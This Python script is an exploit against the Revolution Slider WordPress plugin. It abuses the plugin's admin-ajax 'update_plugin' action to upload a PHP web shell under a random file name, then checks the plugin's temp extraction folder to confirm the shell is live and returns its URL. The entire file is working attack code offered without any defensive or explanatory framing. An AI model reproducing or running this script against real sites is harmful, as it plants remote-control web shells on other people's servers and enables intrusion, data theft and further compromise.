import requests
import random
import string
import os

def random_filename(ext="php"):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + f".{ext}"

def exploit(site_url, payload_path='payloads/simple_shell.php'):
    print(f"[*] Targeting Revslider vuln on: {site_url}")

    try:
        upload_url = f"{site_url}/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=update_plugin"
        shell_name = random_filename()
        payload_abs_path = os.path.abspath(payload_path)

        if not os.path.exists(payload_abs_path):
            print(f"[x] Payload file not found: {payload_abs_path}")
            return False, None

        files = {
            'update_file': (shell_name, open(payload_abs_path, 'rb'), 'application/x-php')
        }

        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Referer': site_url
        }

        print(f"[>] Uploading shell as: {shell_name}")
        r = requests.post(upload_url, files=files, headers=headers, timeout=10)

        if r.status_code == 200 and "success" in r.text.lower():
            shell_url = f"{site_url}/wp-content/plugins/revslider/temp/update_extract/{shell_name}"
            print(f"[+] Upload appears successful. Checking shell at: {shell_url}")

            check = requests.get(shell_url, headers=headers, timeout=10)
            if check.status_code == 200:
                print(f"[âœ”] Shell active at: {shell_url}")
                return True, shell_url
            else:
                print(f"[x] Upload succeeded but shell not found (HTTP {check.status_code})")
        else:
            print(f"[x] Upload failed or no success confirmation (HTTP {r.status_code})")

    except requests.exceptions.RequestException as e:
        print(f"[!] Network or request error: {e}")

    print("[-] Revslider exploit failed.")
    return False, None
